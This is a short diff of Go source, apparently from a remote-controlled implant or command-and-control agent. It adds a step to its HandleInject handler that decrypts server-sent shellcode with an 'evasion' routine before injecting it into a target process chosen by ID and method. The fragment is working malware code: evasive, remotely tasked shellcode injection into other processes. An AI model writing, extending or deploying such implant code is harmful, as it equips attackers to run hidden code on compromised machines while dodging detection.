@@ -39,6 +39,17 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 		})
 	}
 
+	// Optional XOR decrypt: server sets encrypted=true when shellcode was
+	// encrypted with ScEncrypt before transmission (nonce||ciphertext format).
+	if enc, _ := payload["encrypted"].(bool); enc {
+		sc = evasion.ScDecrypt(sc)
+		if len(sc) == 0 {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+				Type: "command_result", CommandID: cmdID, OK: false, Message: "ScDecrypt failed",
+			})
+		}
+	}
+
 	pidFloat, _ := payload["pid"].(float64)
 	pid := uint32(pidFloat)
 	method, _ := payload["method"].(string)
